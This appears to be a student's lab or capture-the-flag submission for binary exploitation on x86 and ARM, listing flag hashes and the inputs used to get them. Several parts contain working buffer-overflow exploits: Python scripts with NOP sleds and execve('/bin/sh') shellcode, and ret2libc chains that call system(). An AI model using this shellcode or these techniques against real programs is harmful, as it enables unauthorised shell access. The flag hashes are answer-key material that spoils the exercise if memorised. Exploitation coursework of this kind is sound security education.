# Submission form

Name: Anmol Agarwal


## x86

### Part 0
* Hash

```d5f5e84c586187797799dde1563d083a```

### Part 1

* Input 
```sh
python -c 'print b"A"*32 + b"\xdb\x85\x04\x08"' | ./part0x01
```
* Hash

```sh

a5df3db3afaef66472e2d3f23ace632e

```
### Part 2

* Input

This is the exploit python file I used: ```exploit.py```

exploit.py:

```sh
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
eip = struct.pack("I", 0xffffc570 + 30)
nopslide = "\x90"*100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
print padding+eip+nopslide+payload
```

To run the code on the submission server. Redirect output of ```exploit.py``` to a temp file like ```tmp/exp ```

```sh
python exploit.py > tmp/exp
```
Then run the code with the part2 file:
```sh
./part0x02 tmp/exp
```
Once you get the shell prompt type in the following command to get the hash
```sh
$ ./solve 
```
* Hash

```b79f25451dc2ae24f99a6cb6d55a14d3```

###  Part 3

* Input

This is the exploit python file I used: ```exploit.py```

exploit.py:

```sh
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" #32 characters to overflow buffer
eip = "\x50\xa2\xe1\xf7" #0xf7e1a250 - system address
retval = "\x20\xd4\xe0\xf7"  #0xf7e0d420  - exit() address
payload = "\xcf\xb3\xf5\xf7"; #0xf7f5b3cf - address of /bin/sh
print padding+eip+retval+payload
```
To run the code on the submission server. Redirect output of ```exploit.py``` to a temp file like ```tmp/exp```

```sh
python exploit.py > tmp/exp
```
Then run the code with the part3 file:
```sh
./part0x03 tmp/exp
```
Once you get the shell prompt type in the following command to get the hash
```sh
$ ./solve 
```
* Hash

```e53b74466920064dc1907eb0ad3d06d8```

## ARM 

### Part 0
* Hash

```e6d6f9017463873525bac700e6859d39```

### Part 1
* Input
```sh
python -c 'print b"A"*24 + b"\xa0\x05\x01\x00"' | ./part0x01
```
* Hash

```e2031f249a1f9cc563a692ec4d8f7fa9```

###  Part 2


* Input

I created a file ```exploit.py```. Here are the contents of the file.

Contents of ```exploit.py```:

```sh
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFF"
eip = struct.pack("<I", 0xbeffe5f8 + 24)
nopslide = "\x90"*1000
payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
print padding+eip+nopslide+payload
```
Then I redirected the output of ```exploit.py``` into a file ```tmp/exp``` as shown in the following command:

```sh
python exploit.py > tmp/exp
```
Then run the program on the server to obtain the hash:
```sh
./part0x02 tmp/exp
```
Then when you get the shell prompt on the server, obtain the hash by typing in:
```sh
$ ./solve 
```

* Hash

```621ac3a4c9d1df5e00a415f492d499b2```

### Part 3

* Input

I created a file ```exploit.py```. Here are the contents of the file.

Contents of ```exploit.py```:
```sh
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFF" #24 characters to overflow buffer
eip = "\xc8\x79\xe7\xb6" # 0xb6e779c8 -  system address
pop = "\xfc\x81\xeb\xb6"  # 0xb6eb81fc -  pop address
retval = "\x80\xd7\xe6\xb6" #0xb6e6d780 -  exit address
payload = "\x6c\xab\xf6\xb6" # 0xb6f6ab6c -  /bin/sh address
print padding+pop+payload+retval+eip
```
Then I redirected the output of ```exploit.py``` into a file ```tmp/exp``` as shown in the following command:
```sh
python exploit.py > tmp/exp
```
Then run the program on the server to obtain the hash:
```sh
./part0x03 tmp/exp
```
Then when you get the shell prompt on the server, obtain the hash by typing in:
```sh
$ ./solve 
```

* Hash

```a725634c3b722a178bb00a9e2ae23d46```

